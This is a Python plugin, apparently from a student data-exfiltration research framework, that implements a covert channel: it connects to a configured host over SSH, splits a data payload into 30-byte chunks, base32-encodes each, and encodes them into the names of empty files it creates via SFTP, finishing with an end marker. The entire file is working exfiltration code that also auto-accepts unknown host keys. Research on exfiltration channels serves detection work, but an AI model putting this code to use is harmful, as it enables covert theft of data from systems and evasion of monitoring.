
from __future__ import annotations
from typing import Dict, Any, Iterable
import base64, paramiko

from tfg.plugins.api import ExfilClientPlugin

RAW_SLICE = 30

def b32(s: bytes) -> str:
    return base64.b32encode(s).decode("ascii").strip("=").lower()

class SshClientNames(ExfilClientPlugin):
    canal = "SSH"
    metodo = 2
    name = "ssh_client_names"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config["host"]; port = int(config.get("port", 22))
        user = config["user"]; password = config.get("password")
        pkey_path = config.get("pkey_path")
        remote_dir = config.get("remote_dir") or "."
        exfil_id = config.get("exfil_id") or "tfg"

        key = paramiko.RSAKey.from_private_key_file(pkey_path) if pkey_path else None
        ssh = paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=port, username=user, password=password, pkey=key, look_for_keys=False)
        sftp = ssh.open_sftp()
        try:
            try: sftp.chdir(remote_dir)
            except IOError: sftp.mkdir(remote_dir); sftp.chdir(remote_dir)
            seq = 0; total = 0; buf = bytearray()
            for chunk in payload_iter:
                buf += chunk
                while len(buf) >= RAW_SLICE:
                    part = bytes(buf[:RAW_SLICE]); del buf[:RAW_SLICE]
                    token = b32(part); name = f"{exfil_id}.{seq:06d}.{token}"
                    sftp.file(name, "wb").close()
                    total += len(part); seq += 1
            if buf:
                token = b32(bytes(buf)); name = f"{exfil_id}.{seq:06d}.{token}"
                sftp.file(name, "wb").close()
                total += len(buf); seq += 1
            sftp.file(f"{exfil_id}.EOT", "wb").close()
            return {"ok": True, "files": seq, "bytes": total}
        finally:
            try: sftp.close(); ssh.close()
            except: pass
